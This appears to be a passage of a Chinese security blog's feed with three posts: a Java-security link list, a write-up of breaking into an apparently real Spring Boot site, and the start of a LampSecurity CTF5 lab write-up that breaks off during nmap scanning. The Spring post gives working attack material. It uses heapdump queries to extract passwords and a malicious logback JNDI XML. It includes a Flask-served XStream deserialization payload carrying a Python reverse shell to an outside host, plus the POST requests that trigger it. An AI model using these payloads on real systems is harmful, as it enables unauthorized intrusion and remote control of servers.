title="Java安全漫谈"></a>Java安全漫谈</h4><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/422128255425528">https://wx.zsxq.com/dweb2/index/topic_detail/422128255425528</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/844142852851442">https://wx.zsxq.com/dweb2/index/topic_detail/844142852851442</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/111885244285122">https://wx.zsxq.com/dweb2/index/topic_detail/111885244285122</a></p><h4 id="Blog-amp-Notes"><a href="#Blog-amp-Notes" class="headerlink" title="Blog&amp;Notes"></a>Blog&amp;Notes</h4><p><a href="https://4ra1n.github.io/">https://4ra1n.github.io</a></p><p><a href="https://space.bilibili.com/1106751850">https://space.bilibili.com/1106751850</a></p><p><a href="https://javasec.org/javaweb/">https://javasec.org/javaweb/</a></p><p><a href="https://github.com/SummerSec/JavaLearnVulnerability">https://github.com/SummerSec/JavaLearnVulnerability</a></p><p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p><p><a href="https://www.yuque.com/pmiaowu/gpy1q8">https://www.yuque.com/pmiaowu/gpy1q8</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从Spring-Boot-Actuator未授权访问到RCE</title>
    <link href="/2023/02/22/%E4%BB%8ESpring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%B0RCE/"/>
    <url>/2023/02/22/%E4%BB%8ESpring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%B0RCE/</url>
    
    <content type="html"><![CDATA[<h4 id="1-敏感接口泄漏"><a href="#1-敏感接口泄漏" class="headerlink" title="1. 敏感接口泄漏"></a>1. 敏感接口泄漏</h4><p>在打项目的时候，开启burp被动扫描到目标站点的某端口下是springboot的后端，并且存在着一个<a href="http://site.ip:8000/cloud/..;/env">http://site.ip:8000/cloud/..;/env</a></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230226172823810.png" alt="image-20230226172823810"></p><h4 id="2-搜索利用"><a href="#2-搜索利用" class="headerlink" title="2. 搜索利用"></a>2. 搜索利用</h4><p>在组内师傅的提醒下发现这种接口存在着敏感信息泄漏，指的是配置文件中password字段。</p><p>参考<a href="https://www.freebuf.com/articles/web/271347.html">https://www.freebuf.com/articles/web/271347.html</a> 这篇文章，详细讲解了Spring Boot漏洞利用方法，我在这里面找到了关于env接口为授权的部分，开始尝试利用。</p><p>Spring env接口的暴露第一个漏洞点就是敏感信息泄漏，虽然在这个接口中password字段会以*来脱敏，但是可以通过&#x2F;heapdump接口来下载JVM堆中对象使用情况，通过 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 或者jdk默认的jvisualvm工具来分析它，从而拿到敏感信息做进一步利用。</p><p>通过使用<code>select s.value.toString() from java.util.LinkedHashMap$Entry s where /password/.test(s.key.toString())</code>查询到敏感信息</p><p>这里补充下，目标站点是springboot2，而springboot1是</p><p><code>select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230226174008524.png" alt="image-20230226174008524"></p><h4 id="3-拓展"><a href="#3-拓展" class="headerlink" title="3. 拓展"></a>3. 拓展</h4><p>本来仅仅是提交一个未授权访问漏洞，感觉太无聊，而在上面那篇文章中发现可能存在的RCE，所以我想尝试一下，并且在这之前这个目标系统还有个api接口未授权的洞，和师傅讨论了一下感觉对面站点好欺负，决定尝试一下。</p><p>我们决定使用<code>restart logging.config logback JNDI RCE</code>这个方法。</p><p>这个漏洞的利用条件目标站都符合</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">可以 POST 请求目标网站的 /env接口设置属性<br>可以 POST 请求目标网站的 /<span class="hljs-keyword">restart</span>接口重启应用<br>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; <span class="hljs-number">6</span>u201/<span class="hljs-number">7</span>u191/<span class="hljs-number">8</span>u182/<span class="hljs-number">11.0</span><span class="hljs-number">.1</span>(LDAP)，但相关环境可绕过<br>目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 <span class="hljs-keyword">restart</span> 会导致程序异常退出<br>HTTP 服务器如果返回含有畸形 <span class="hljs-type">xml</span> 语法内容的文件，会导致程序异常退出<br>JNDI 服务返回的 <span class="hljs-keyword">object</span> 需要实现javax.naming.spi.ObjectFactory接口，否则会导致程序异常退出<br></code></pre></td></tr></table></figure><p>这里要求有vps托管恶意 ldap 服务及代码以实现jndi注入，并且需要启一个文件服务器构造一个恶意的xml文件让服务器去解析其中的ldap协议。</p><p>恶意xml: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">insertFromJNDI</span> <span class="hljs-attr">env-entry-name</span>=<span class="hljs-string">&quot;ldap://your-vps-ip:1389&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;appName&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对目标服务器发送这个恶意数据包</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /cloud/..;/env<br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: application/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;logging.config&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example.xml&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>发送完之后重启应用使配置文件生效</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /actuator/restart <br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: application/json<br></code></pre></td></tr></table></figure><p>很遗憾的是，我们尝试后发现失败了，我的文件服务器没有收到来自目标系统的请求，当时我在猜测目标系统不出网的可能性，不出网的话打算放弃了。这时候师傅提醒我，目标站并没有安全意识，应该不会有安全策略类似于不出网之类的配置，所以我决定再尝试一下。</p><h4 id="4-继续尝试"><a href="#4-继续尝试" class="headerlink" title="4. 继续尝试"></a>4. 继续尝试</h4><p>通过搜索资料，我在这个博文中发现了可能利用的点。</p><p><a href="https://blog.csdn.net/god_zzZ/article/details/122837698">https://blog.csdn.net/god_zzZ/article/details/122837698</a></p><p>spring eureka xstream deserialization RCE</p><p>利用条件为:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">可以 POST 请求目标网站的 /<span class="hljs-keyword">env</span> 接口设置属性<br>可以 POST 请求目标网站的 /<span class="hljs-keyword">refresh</span> 接口刷新配置（存在 <span class="hljs-keyword">spring</span>-boot-starter-actuator 依赖）<br>目标使用的 eureka-client &lt; <span class="hljs-number">1.8</span><span class="hljs-number">.7</span>（通常包含在 <span class="hljs-keyword">spring</span>-cloud-starter-netflix-eureka-client 依赖中）<br>目标可以请求攻击者的 HTTP 服务器（请求可出外网）<br></code></pre></td></tr></table></figure><p>漏洞原理是:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">eureka.<span class="hljs-keyword">client</span>.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka <span class="hljs-keyword">server</span> URL 地址<br>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka <span class="hljs-keyword">server</span> 就会返回恶意的 payload<br>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞<br></code></pre></td></tr></table></figure><p>我启动了一个python flask服务，构造恶意的xml文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding: utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">catch_all</span>(<span class="hljs-params">path</span>):<br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span><br><span class="hljs-string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="hljs-string">      &lt;dataHandler&gt;</span><br><span class="hljs-string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="hljs-string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="hljs-string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="hljs-string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="hljs-string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="hljs-string">                    &lt;command&gt;</span><br><span class="hljs-string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;-c&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&lt;/string&gt;</span><br><span class="hljs-string">                    &lt;/command&gt;</span><br><span class="hljs-string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="hljs-string">                  &lt;/next&gt;</span><br><span class="hljs-string">                &lt;/iter&gt;</span><br><span class="hljs-string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="hljs-string">                  &lt;method&gt;</span><br><span class="hljs-string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="hljs-string">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="hljs-string">                    &lt;parameter-types/&gt;</span><br><span class="hljs-string">                  &lt;/method&gt;</span><br><span class="hljs-string">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="hljs-string">                &lt;/filter&gt;</span><br><span class="hljs-string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="hljs-string">              &lt;/serviceIterator&gt;</span><br><span class="hljs-string">              &lt;lock/&gt;</span><br><span class="hljs-string">            &lt;/cipher&gt;</span><br><span class="hljs-string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="hljs-string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="hljs-string">          &lt;/is&gt;</span><br><span class="hljs-string">        &lt;/dataSource&gt;</span><br><span class="hljs-string">      &lt;/dataHandler&gt;</span><br><span class="hljs-string">    &lt;/value&gt;</span><br><span class="hljs-string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Response(xml, mimetype=<span class="hljs-string">&#x27;application/xml&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">443</span>)<br></code></pre></td></tr></table></figure><p>同时nc监听8080端口</p><p>构造数据包修改<code>eureka.client.serviceUrl.defaultZone</code>为自己的恶意web服务器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /cloud/..;<span class="hljs-regexp">/env HTTP/</span><span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <span class="hljs-attr">targethost</span>:port<br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10.15</span>; <span class="hljs-attr">rv</span>:<span class="hljs-number">94.0</span>) <span class="hljs-title class_">Gecko</span>/<span class="hljs-number">20100101</span> <span class="hljs-title class_">Firefox</span>/<span class="hljs-number">94.0</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Sec-Fetch-Dest: document</span><br><span class="hljs-comment">Sec-Fetch-Mode: navigate</span><br><span class="hljs-comment">Sec-Fetch-Site: none</span><br><span class="hljs-comment">Sec-Fetch-User: ?1</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 61</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">eureka.client.serviceUrl.defaultZone=http://myvps:443</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230226181948492.png" alt="image-20230226181948492"></p><p>返回200后请求它的未授权的<code>/refresh</code>刷新配置</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230226182111277.png" alt="image-20230226182111277"></p><p>虽然说它爆500了，但这丝毫不影响我的结果，我的服务器已经能收到请求了</p><p>(在决定用这个漏洞之前我就已经请求过一次这个接口了，发现爆了500，不过我还是决定尝试一下)</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230226182407814.png" alt="image-20230226182407814"></p><p>在它请求为get请求时我成功getshell了！</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230226182226534.png" alt="image-20230226182226534"></p><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h4><p>在找资料的时候我还发现了一个关于springboot站渗透的仓库，我的github收藏夹又增加了</p><p><a href="https://github.com/LandGrey/SpringBootVulExploit/">https://github.com/LandGrey/SpringBootVulExploit/</a></p><p>以后碰到spirngboot站没思路拿不下来时就来着看看:)</p><p>还是要感谢组内师傅的帮助，如果没有他我可能开始的时候就不会想着去利用，也可能在中途因为一个失败就放弃。</p><p>渗透就是要Try Harder，在getshell的一瞬间前面的所有努力都是有价值的。</p><h4 id="6-尾声"><a href="#6-尾声" class="headerlink" title="6. 尾声"></a>6. 尾声</h4><p>虽然渗透结束了，但还有些问题没有解决，比如第一种方法为什么没有请求我的服务器。还有，对于springboot的站，我了解是不是太少了，spring cloud的运行原理，我还一窍不通，在之后我会去试着了解springboot的漏洞原理，不能只依靠别人的文章。</p><h4 id="7-待续…"><a href="#7-待续…" class="headerlink" title="7. 待续…"></a>7. 待续…</h4><p>spring boot&amp;spring cloud 学习…等待更新</p>]]></content>
    
    
    <categories>
      
      <category>实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LampSecurityCTF5</title>
    <link href="/2022/12/20/LampSecurityCTF5/"/>
    <url>/2022/12/20/LampSecurityCTF5/</url>
    
    <content type="html"><![CDATA[<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>确定目标为192.168.80.171</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/opt]<br>└─$ sudo arp-scan -l<br>[sudo] password <span class="hljs-keyword">for</span> neil:<br>Interface: eth0, <span class="hljs-built_in">type</span>: EN10MB, MAC: 00:0c:29:8e:50:54, IPv4: 192.168.80.158<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.80.1    00:50:56:c0:00:08       VMware, Inc.<br>192.168.80.2    00:50:56:ff:51:55       VMware, Inc.<br>192.168.80.170  00:0c:29:<span class="hljs-built_in">df</span>:af:0f       VMware, Inc.<br>192.168.80.171  00:0c:29:9a:0f:07       VMware, Inc.<br>192.168.80.254  00:50:56:e7:c9:95       VMware, Inc.<br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~/opt]<br>└─$ sudo masscan -p 1-65535 --rate 10000 192.168.80.171<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-12-20 08:06:43 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [65535 ports/host]<br>Discovered open port 111/tcp on 192.168.80.171<br>Discovered open port 37282/tcp on 192.168.80.171<br>Discovered open port 80/tcp on 192.168.80.171<br>Discovered open port 110/tcp on 192.168.80.171<br>Discovered open port 143/tcp on 192.168.80.171<br>Discovered open port 25/tcp on 192.168.80.171<br>Discovered open port 901/tcp on 192.168.80.171<br>Discovered open port 3306/tcp on 192.168.80.171<br>Discovered open port 445/tcp on 192.168.80.171<br>Discovered open port 22/tcp on 192.168.80.171<br><br>┌──(neil㉿kali)-[~/opt]<br>└─$ nmap -sT -sC -sV -O 192.168.80.171 -p111,37282,80,110,143,25,901,3306,445,22<br>TCP/IP fingerprinting (<span class="hljs-keyword">for</span> OS scan) requires root privileges.<br>QUITTING!<br><br>┌──(neil㉿kali)-[~/opt]<br>└─$ sudo nmap -sT -sC -sV -O 192.168.80.171 -p111,37282,80,110,143,25,901,3306,445,22<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-20 16:10 CST<br>Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 99.85% <span class="hljs-keyword">done</span>; ETC: 16:11 (0:00:00 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.171<br>Host is up (0.00057s latency).<br><br>PORT      STATE SERVICE     VERSION<br>22/tcp    open  ssh         OpenSSH 4.7 (protocol 2.0)<br>| ssh-hostkey:<br>|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:<span class="hljs-built_in">cd</span>:3d (DSA)<br>|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)<br>25/tcp    open  smtp        Sendmail 8.14.1/8.14.1<br>| smtp-commands: localhost.localdomain Hello [192.168.80.158], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP<br>|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use <span class="hljs-string">&quot;HELP &lt;topic&gt;&quot;</span>. 2.0.0 To report bugs <span class="hljs-keyword">in</span> the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For <span class="hljs-built_in">local</span> information send email to Postmaster at your site. 2.0.0 End of HELP info<br>80/tcp    open  http        Apache httpd 2.2.6 ((Fedora))<br>|_http-server-header: Apache/2.2.6 (Fedora)<br>|_http-title: Phake Organization<br>110/tcp   open  pop3        ipop3d 2006k.101<br>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br>| Not valid before: 2009-04-29T11:31:53<br>|_Not valid after:  2010-04-29T11:31:53<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-12-20T04:13:57+00:00; -3h58m17s from scanner time.<br>|_pop3-capabilities: STLS TOP LOGIN-DELAY(180) UIDL USER<br>111/tcp   open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo:<br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100024  1          32768/udp   status<br>|_  100024  1          37282/tcp   status<br>143/tcp   open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0500)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-12-20T04:13:58+00:00; -3h58m16s from scanner time.<br>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br>| Not valid before: 2009-04-29T11:31:53<br>|_Not valid after:  2010-04-29T11:31:53<br>|_imap-capabilities: WITHIN completed NAMESPACE BINARY OK STARTTLSA0001 SCAN THREAD=REFERENCES MULTIAPPEND SORT IDLE ESEARCH LITERAL+ CHILDREN LOGIN-REFERRALS CAPABILITY SASL-IR UIDPLUS THREAD=ORDEREDSUBJECT UNSELECT IMAP4REV1 MAILBOX-REFERRALS<br>445/tcp   open  netbios-ssn Samba smbd 3.0.26a-6.fc8 (workgroup: MYGROUP)<br>901/tcp   open  http        Samba SWAT administration server<br>|_http-title: 401 Authorization Required<br>| http-auth:<br>| HTTP/1.0 401 Authorization Required\x0D<br>|_  Basic realm=SWAT<br>3306/tcp  open  mysql       MySQL 5.0.45<br>| mysql-info:<br>|   Protocol: 10<br>|   Version: 5.0.45<br>|   Thread ID: 5<br>|   Capabilities flags: 41516<br>|   Some Capabilities: SupportsCompression, Support41Auth, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag<br>|   Status: Autocommit<br>|_  Salt: &gt;OR.-6h,@&gt;Tk@=Q_hnn`<br>37282/tcp open  status      1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 00:0C:29:9A:0F:07 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6<br>OS details: Linux 2.6.9 - 2.6.30<br>Network Distance: 1 hop<br>Service Info: Hosts: localhost.localdomain, 192.168.80.171; OS: Unix<br><br>Host script results:<br>|_clock-skew: mean: -2h43m15s, deviation: 2h30m01s, median: -3h58m16s<br>|_smb2-time: Protocol negotiation failed (SMB2)<br>| smb-security-mode:<br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb-os-discovery:<br>|   OS: Unix (Samba 3.0.26a-6.fc8)<br>|   Computer name: localhost<br>|   NetBIOS computer name:<br>|   Domain name: localdomain<br>|   FQDN: localhost.localdomain<br>|_  System time: 2022-12-19T23:12:45-05:00<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 87.83 seconds<br><br>┌──(neil㉿kali)-[~/opt]<br>└─$ sudo nmap -sU 192.168.80.171 -p111,37282,80,110,143,25,901,3306,445,22<br>[sudo] password <span class="hljs-keyword">for</span> neil:<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-20 16:29 CST<br>Nmap scan report <span 